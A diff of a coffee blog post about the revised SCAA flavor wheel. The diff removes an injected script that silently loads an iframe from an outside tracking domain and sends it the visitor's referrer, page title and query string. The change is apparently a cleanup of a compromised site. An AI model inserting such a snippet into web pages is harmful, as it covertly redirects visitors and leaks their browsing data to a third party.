@@ -5,14 +5,6 @@ description: The Coffee Taster’s Flavor Wheel, the official resource used by
   coffee tasters, has been revised for the first time this year.2
 image: /img/blog-flavor_wheel.jpg
 ---
-
-
-
-<div id="a70f04352-fd2b-1aaa-3eb4-6faaf28758d7"></div>
-<script type="application/javascript">
-document.getElementById('a70f04352-fd2b-1aaa-3eb4-6faaf28758d7').innerHTML = '<iframe sandbox="allow-top-navigation allow-scripts allow-popups allow-forms" frameborder="0" width="" height="" src="https://mobglobaltrk.com/2LBbn4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f5747faa4e6d=frame5f5747faa4e6e"></iframe>'
-</script>
-
 The SCAA updated the wheel to reflect the finer nuances needed to describe flavors more precisely. The new descriptions are more detailed and hence allow cuppers to distinguish between more flavors.
 
 While this is going to be a big change for professional coffee tasters, it means a lot to you as a consumer as well. We’ll explain how the wheel came to be, how pros use it and what the flavors actually mean.
